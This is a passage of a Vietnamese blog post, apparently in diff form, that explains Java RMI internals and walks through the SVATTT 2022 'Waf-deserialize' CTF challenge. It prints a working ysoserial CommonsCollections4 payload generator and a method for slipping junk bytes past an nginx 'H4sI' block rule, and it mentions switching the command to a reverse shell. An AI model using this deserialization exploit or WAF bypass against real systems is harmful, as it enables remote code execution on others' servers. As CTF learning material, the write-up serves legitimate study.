+            <span class="n">LiveRef</span> <span class="n">var2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LiveRef</span><span class="o">(</span><span class="n">id</span><span class="o">,</span> <span class="n">var1</span><span class="o">);</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">setup</span><span class="o">(</span><span class="k">new</span> <span class="n">UnicastServerRef</span><span class="o">(</span><span class="n">var2</span><span class="o">));</span>
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+</code></pre></div><p>Do tại đây <code>System.getSecurityManager()</code> trả ra giá trị null cho nên sẽ nhảy vào else:</p>
+<p>khởi tạo LiveRef với id và port</p>
+<p><img src="https://hackmd.io/_uploads/S1isiQRCJe.png" alt="image"></p>
+<p>Call setup method để export Obj:</p>
+<p><img src="https://hackmd.io/_uploads/SJ9Un7ACkx.png" alt="image"></p>
+<h3 id="chi-tiết-về-quá-trình-xử-lý-khi-lookup-object-với-registry-của-client">Chi tiết về quá trình xử lý khi lookup object với Registry của Client</h3>
+<p><img src="https://hackmd.io/_uploads/ryGSLERCkx.png" alt="image"></p>
+<h2 id="svattt-quals-2022-waf-deserialize">SVATTT-Quals-2022: Waf-deserialize</h2>
+<p>Chương trình cho ta source code và file jar, load file jar thì quan sát được ở đây là một chương trình java spring boot:</p>
+<p><img src="https://hackmd.io/_uploads/ryS6joxlxx.png" alt="image"></p>
+<p>với controller chính và duy nhất ở đây đó là <code>UserController</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="c1">//
+</span><span class="c1">// Source code recreated from a .class file by IntelliJ IDEA
+</span><span class="c1">// (powered by FernFlower decompiler)
+</span><span class="c1">//
+</span><span class="c1"></span>
+<span class="kn">package</span> <span class="nn">vcs.example.wafdeser</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.charset.StandardCharsets</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.zip.GZIPInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.GetMapping</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.PathVariable</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMethod</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestParam</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="o">;</span>
+
+<span class="nd">@RestController</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">UserController</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="nf">UserController</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+
+    <span class="nd">@GetMapping</span><span class="o">({</span><span class="s">&#34;/&#34;</span><span class="o">})</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">sayHello</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">&#34;Hello ASCIS&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="nd">@RequestMapping</span><span class="o">(</span>
+        <span class="n">value</span> <span class="o">=</span> <span class="o">{</span><span class="s">&#34;/info/{info}&#34;</span><span class="o">},</span>
+        <span class="n">method</span> <span class="o">=</span> <span class="o">{</span><span class="n">RequestMethod</span><span class="o">.</span><span class="na">GET</span><span class="o">}</span>
+    <span class="o">)</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getUser</span><span class="o">(</span><span class="nd">@PathVariable</span><span class="o">(</span><span class="s">&#34;info&#34;</span><span class="o">)</span> <span class="n">String</span> <span class="n">info</span><span class="o">,</span> <span class="nd">@RequestParam</span><span class="o">(</span><span class="n">name</span> <span class="o">=</span> <span class="s">&#34;compress&#34;</span><span class="o">,</span><span class="n">defaultValue</span> <span class="o">=</span> <span class="s">&#34;false&#34;</span><span class="o">)</span> <span class="n">Boolean</span> <span class="n">isCompress</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">unencodedData</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">unEncode</span><span class="o">(</span><span class="n">info</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">returnData</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">data</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getMimeDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">unencodedData</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">isCompress</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">InputStream</span> <span class="n">is</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">data</span><span class="o">);</span>
+            <span class="n">InputStream</span> <span class="n">is</span> <span class="o">=</span> <span class="k">new</span> <span class="n">GZIPInputStream</span><span class="o">(</span><span class="n">is</span><span class="o">);</span>
+            <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="n">is</span><span class="o">);</span>
+
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">User</span> <span class="n">user</span> <span class="o">=</span> <span class="o">(</span><span class="n">User</span><span class="o">)</span><span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                <span class="n">returnData</span> <span class="o">=</span> <span class="n">user</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
+                <span class="n">ois</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var9</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">returnData</span> <span class="o">=</span> <span class="s">&#34;?????&#34;</span><span class="o">;</span>
+            <span class="o">}</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="n">returnData</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">data</span><span class="o">,</span> <span class="n">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">);</span>
+        <span class="o">}</span>
+
+        <span class="k">return</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">&#34;Hello %s&#34;</span><span class="o">,</span> <span class="n">returnData</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="n">String</span> <span class="nf">unEncode</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&#34;-&#34;</span><span class="o">,</span> <span class="s">&#34;\\r\\n&#34;</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&#34;%3D&#34;</span><span class="o">,</span> <span class="s">&#34;=&#34;</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&#34;%2B&#34;</span><span class="o">,</span> <span class="s">&#34;\\+&#34;</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&#34;_&#34;</span><span class="o">,</span> <span class="s">&#34;/&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>ở đây có thể thấy có 2 api chính là <code>/</code> thì đơn giản trả về chuỗi <code>Hello ASCIS</code> nếu ta truy cập tới <code>/info/{info}</code> thì chương trình sẽ xử lí với controller getUser và lấy chuỗi info gắn vào biến info -&gt; ở đây ta có thể truyền vào param compress -&gt; chuỗi info sẽ được unEncode với method <code>unEncode</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="n">String</span> <span class="nf">unEncode</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&#34;-&#34;</span><span class="o">,</span> <span class="s">&#34;\\r\\n&#34;</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&#34;%3D&#34;</span><span class="o">,</span> <span class="s">&#34;=&#34;</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&#34;%2B&#34;</span><span class="o">,</span> <span class="s">&#34;\\+&#34;</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&#34;_&#34;</span><span class="o">,</span> <span class="s">&#34;/&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+</code></pre></div><p>hàm này sẽ thay thế tất cả kí tự <code>-</code> thành <code>\r\n</code> và <code>%3D</code> thành <code>=</code>, <code>%2B</code> thành <code>+</code>, <code>_</code> thành <code>/</code>.</p>
+<p>Sau đó chuỗi này sẽ được base64 decode và nếu <code>isCompress</code> được ta truyền là true thì dữ liệu sẽ được deserialize <code>User user = (User)ois.readObject();</code></p>
+<p>Để ý thì Dockerfile có xử lý</p>
+<div class="highlight"><pre class="chroma"><code class="language-yaml" data-lang="yaml"><span class="l">FROM  openjdk:11-slim</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="l">COPY ./waf-deser-0.0.1-SNAPSHOT.jar /waf-deser-0.0.1-SNAPSHOT.jar</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="l">COPY ./flag /flag</span><span class="w">
+</span><span class="w"></span><span class="l">COPY ./readflag /readflag</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="l">RUN chmod 0400 /flag</span><span class="w">
+</span><span class="w"></span><span class="l">RUN chmod 4755 /readflag</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="l">RUN useradd -m app</span><span class="w">
+</span><span class="w"></span><span class="l">RUN rm /usr/bin/perl*</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="l">USER app</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="l">ENTRYPOINT [&#34;java&#34;, &#34;-jar&#34;, &#34;/waf-deser-0.0.1-SNAPSHOT.jar&#34;]</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="l">EXPOSE 8080</span><span class="w">
+</span></code></pre></div><p>do đó thì bài này theo ý sẽ là deserialize2RCE để đọc flag.</p>
+<p>quan sát trong lib:</p>
+<p><img src="https://hackmd.io/_uploads/H1WLenxeex.png" alt="image"></p>
+<p>ở đây ta thấy có cc4-4.0.jar</p>
+<p>do đó nên ta sẽ chọn:</p>
+<p><img src="https://hackmd.io/_uploads/ByTKe3lxxg.png" alt="image"></p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">main</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">ysoserial.payloads.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">ysoserial.payloads.util.CmdExecuteHelper</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.zip.GZIPOutputStream</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Main</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">CmdExecuteHelper</span> <span class="n">cmd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CmdExecuteHelper</span><span class="o">(</span><span class="s">&#34;bash&#34;</span><span class="o">,</span> <span class="s">&#34;bash -c &#39;touch /tmp/l3mnt2010&#39;&#34;</span><span class="o">);</span>
+        <span class="n">Object</span> <span class="n">payload</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CommonsCollections4</span><span class="o">().</span><span class="na">getObject</span><span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">getCommand</span><span class="o">());</span>
+<span class="c1">//        System.out.println(cmd.getCommand());
+</span><span class="c1"></span>
+        <span class="n">ByteArrayOutputStream</span> <span class="n">baos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="n">GZIPOutputStream</span> <span class="n">gzipOut</span> <span class="o">=</span> <span class="k">new</span> <span class="n">GZIPOutputStream</span><span class="o">(</span><span class="n">baos</span><span class="o">);</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">objectOut</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">gzipOut</span><span class="o">);</span>
+
+        <span class="n">objectOut</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">payload</span><span class="o">);</span>
+        <span class="n">objectOut</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">dat</span> <span class="o">=</span> <span class="n">baos</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>
+        <span class="n">String</span> <span class="n">a</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getMimeEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">dat</span><span class="o">);</span>
+        <span class="n">a</span> <span class="o">=</span> <span class="n">a</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&#34;/&#34;</span><span class="o">,</span><span class="s">&#34;_&#34;</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">a</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>ta sẽ gen payload tạo /tmp/l3mnt2010 và thay thế tất cả những kí tự <code>/</code> thành <code>_</code> để khi hàm kia unEncode sẽ trả về cho ta chuỗi cũ.</p>
+<p>-&gt; vấn đề đã giải quyết nhưng trong nginx.conf còn có một vấn đề nữa đó là:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">server</span> <span class="o">{</span>    
+    <span class="n">listen</span> <span class="n">80</span><span class="o">;</span>
+
+    <span class="n">large_client_header_buffers</span> <span class="n">4</span> <span class="n">3000</span><span class="o">;</span> <span class="err">#</span> <span class="n">Limit</span> <span class="n">URI</span> <span class="n">length</span> <span class="n">upto</span> <span class="n">3000</span> <span class="n">bytes</span>
+
+    <span class="n">location</span> <span class="o">~*</span> <span class="n">H4sI</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="n">403</span> <span class="err">&#39;</span><span class="n">Deserialization</span> <span class="n">of</span> <span class="n">Untrusted</span> <span class="n">Data</span> <span class="n">Detected</span><span class="o">.</span> <span class="o">(</span><span class="n">From</span> <span class="n">real</span> <span class="n">WAF</span> <span class="n">with</span> <span class="o">&lt;</span><span class="n">3</span><span class="o">)</span><span class="err">&#39;</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="n">location</span> <span class="o">/</span> <span class="o">{</span>
+        <span class="n">proxy_set_header</span>   <span class="n">X</span><span class="o">-</span><span class="n">Forwarded</span><span class="o">-</span><span class="n">For</span> <span class="n">$remote_addr</span><span class="o">;</span>
+        <span class="n">proxy_set_header</span>   <span class="n">Host</span> <span class="n">$http_host</span><span class="o">;</span>
+        <span class="n">proxy_pass</span>         <span class="s">&#34;http://web:8080&#34;</span><span class="o">;</span>
+    <span class="o">}</span>
+
+<span class="o">}</span>
+</code></pre></div><p>ở đây có triển khai là nếu uri length quá 3000 kí tự thì sẽ không cho phép, và nếu uri path có chuỗi H4sI thì sẽ không thể gửi request đến controller -&gt; ở đây ta sẽ thêm <code>@@</code> và giữa chuỗi vì nếu ta thêm 2 kí tự này thì chúng được coi như là byte rác và bỏ qua chúng.</p>
+<p><img src="https://hackmd.io/_uploads/SyNQMnelgx.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ByzVz3exll.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HJ-rfhggll.png" alt="image"></p>
+<p>rce thành công và thay command thành reverse-shell để lấy flag.</p>
+
+
+        
+          <div class="blog-tags">
+            
+              
+              <a href="https://l3mnt2010.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
+            
+              
+              <a href="https://l3mnt2010.github.io/tags/java/">Java</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://l3mnt2010.github.io/xxe-lab/" data-toggle="tooltip" data-placement="top" title="XXE lab">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://l3mnt2010.github.io/liferay-pentest/" data-toggle="tooltip" data-placement="top" title="Liferay Pentest">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      <footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            0001
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+<script src="https://l3mnt2010.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://l3mnt2010.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
